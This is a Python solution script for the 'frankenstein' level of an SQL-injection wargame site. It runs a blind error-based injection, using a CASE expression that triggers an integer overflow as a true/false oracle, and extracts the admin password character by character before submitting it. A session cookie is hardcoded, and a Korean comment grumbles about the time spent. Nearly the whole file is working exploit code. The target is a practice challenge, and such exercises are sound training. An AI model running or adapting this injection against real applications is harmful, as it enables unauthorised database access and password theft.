import requests
from time import time


def get(pw):
    return requests.get(
        'https://los.rubiya.kr/chall/frankenstein_b5bab23e64777e1756174ad33f14b5db.php',
        params={"pw":pw},
        cookies={'PHPSESSID': 'k2re1rtpnv4o5ul7dcu3b5kbn0'}).text

# get password
password='0x'
while True:
    for c in range(32, 128):
        print("Try", password + hex(c)[2:])
        if "error" != get(f"'||id='admin'&&case when pw>{password + hex(c)[2:]} then ~0+1 else 0 end -- -")[-5:]:
           password += hex(c-1)[2:]
           break
    else:
        password = hex(int(password, 16)+1)
        print("Password is", password)
        break

    print(password)

# id: frankenstein pw: nietsneknarf 으아... 내시간... ㅠㅜㅜㅜ
# password is 0dc4efbb

# certify
print(get(bytes.fromhex(password[2:]).decode('utf-8').lower()))
